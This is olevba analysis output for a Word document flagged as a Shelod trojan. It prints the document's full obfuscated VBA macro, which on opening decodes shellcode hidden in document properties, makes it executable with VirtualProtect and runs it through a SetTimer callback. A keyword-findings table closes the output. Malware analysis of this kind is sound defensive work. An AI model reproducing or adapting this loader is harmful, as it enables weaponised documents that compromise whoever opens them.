olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-786fd0f5de0776ad555716b2dd2d3982343afc3843e255b70d3654982de2dc4a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-786fd0f5de0776ad555716b2dd2d3982343afc3843e255b70d3654982de2dc4a - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function TricklikeAphototropicCopresence Lib "user32" Alias "KillTimer" (ByVal LinoxinScabiosasBurlier As LongPtr, ByVal CaloriesWaterprooferGalleasses As LongPtr) As LongPtr
#Else
Private Declare Function OvermercifulnessMermaiden Lib "user32" Alias "SetTimer" ( ByVal AmphipodsArthrocarcinomaManatidae As Long, ByVal PackthreadStannideTristan As Long, ByVal SubcranialKomondors As Long, ByVal ResultfulnessSerranidsIdeographically As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function OvermercifulnessMermaiden Lib "user32" Alias "SetTimer" (ByVal ImbricateChaplaincies As LongPtr, ByVal SchizophreneRosehip As LongPtr, ByVal AffixtureOutcrowPolish As LongPtr, ByVal LoricationCondensates As LongPtr) As LongPtr
Private Declare PtrSafe Function BananasUntire Lib "kernel32" Alias "VirtualProtect" (ByVal FatbackDeliberandum As LongPtr, ByVal NonvariablyKibbeh As LongPtr, ByVal EmpennageBradyspermatism As LongPtr, RandierFrustraneous As LongPtr) As LongPtr
#Else
Private Declare Function BananasUntire Lib "kernel32" Alias "VirtualProtect"  (ByVal VeramentManeuvred As Long, ByVal HippocerfCounterrampantGuaiacs As Long, ByVal UpshoveEuthenistSnooping As Long, ShortishHepatogenousCankerfret As Long) As Long
Private Declare Function TricklikeAphototropicCopresence Lib "user32" Alias "KillTimer" ( ByVal EluentMilanion As Long, ByVal PiroplasmataUmbilicarUnperfectively As Long) As Long
#End If
Private Sub Document_Open()
Dim PelargiFlubdubberyFairyism() As Byte
#If Win64 Then
PelargiFlubdubberyFairyism = ObtuseAnticardiac(ActiveDocument.BuiltInDocumentProperties(Uz7O6olv6("Xwu6u6sgw0U")).Value)
#Else
PelargiFlubdubberyFairyism = ObtuseAnticardiac(ActiveDocument.BuiltInDocumentProperties(Uz7O6olv6("voyPN66hgrE")).Value)
#End If
#If VBA7 Then
Dim JellifiedLusitania As LongPtr
Dim DenaturiserTetteringDusked As LongPtr
Dim ClockroomStarvelings As LongPtr
Dim PerhorresceGigster As LongPtr
#Else
Dim JellifiedLusitania As Long
Dim DenaturiserTetteringDusked As Long
Dim ClockroomStarvelings As Long
Dim PerhorresceGigster As Long
#End If
DenaturiserTetteringDusked = UBound(PelargiFlubdubberyFairyism) + 1
ClockroomStarvelings = VarPtr(PelargiFlubdubberyFairyism(0))
BananasUntire ClockroomStarvelings, DenaturiserTetteringDusked, 64, VarPtr(JellifiedLusitania)
GetObject(Uz7O6olv6("hQQEZ9cS9")).Environment(Uz7O6olv6("ZwAIMffY"))(Uz7O6olv6("JqVF830")) = ActiveDocument.FullName
GetObject(Uz7O6olv6("rQQIgpa")).Environment(Uz7O6olv6("NhukuZs4"))(Uz7O6olv6("MnaBRw")) = Uz7O6olv6("VHMDvzATG")
PerhorresceGigster = OvermercifulnessMermaiden(0, ClockroomStarvelings, 1, ClockroomStarvelings)
NetmakingMultiformityPedicabs 1
TricklikeAphototropicCopresence 0, PerhorresceGigster
GetObject(Uz7O6olv6("oUQaMhTD0J3")).Environment(Uz7O6olv6("eiYPPKyIvO3")).Remove (Uz7O6olv6("GYBK_y"))
GetObject(Uz7O6olv6("QxFvj5JK")).Environment(Uz7O6olv6("dDUpeX_9t")).Remove (Uz7O6olv6("XtoPdkZ"))
ReDim PelargiFlubdubberyFairyism(1)
End Sub
Sub NetmakingMultiformityPedicabs(Finish)
Dim MarmarizeHourly As Long
Dim LaemostenosisPreagonyGimberjawed As Long
LaemostenosisPreagonyGimberjawed = Timer() + (Finish)
Do
MarmarizeHourly = Timer()
DoEvents
Loop Until MarmarizeHourly > LaemostenosisPreagonyGimberjawed
End Sub
Function SylidClavate(DebossJacktanVised, HumidorsTwattled)
SylidClavate = Mid(DebossJacktanVised, HumidorsTwattled + 1, 1)
End Function
Public Function Uz7O6olv6(strInput)
Uz7O6olv6 = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function ProfessesIsovalerate(CashbooksCoxcombicalityForebitter) As Long
If Int(Rnd(23)) > 2 Then
ProfessesIsovalerate = 9000
Else
ProfessesIsovalerate = Len(CashbooksCoxcombicalityForebitter)
End If
End Function
Function ObtuseAnticardiac(AphodusDisintegrableJargonistic)
ReDim PomeraniansDuplicator(ProfessesIsovalerate(AphodusDisintegrableJargonistic) - 1) As Byte
Dim AddictRorippa As Long, DemonetizedSteepdown As Long
Dim DisjectedDowncasts: DisjectedDowncasts = Uz7O6olv6("wUY9C8uf") & Uz7O6olv6("omtTo5HLG")
For AddictRorippa = 0 To ProfessesIsovalerate(AphodusDisintegrableJargonistic) - 1 Step 2
DemonetizedSteepdown = AddictRorippa / 2
PomeraniansDuplicator(DemonetizedSteepdown) = CDec(DisjectedDowncasts & SylidClavate(AphodusDisintegrableJargonistic, AddictRorippa) & SylidClavate(AphodusDisintegrableJargonistic, AddictRorippa + 1))
Next
ObtuseAnticardiac = PomeraniansDuplicator
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

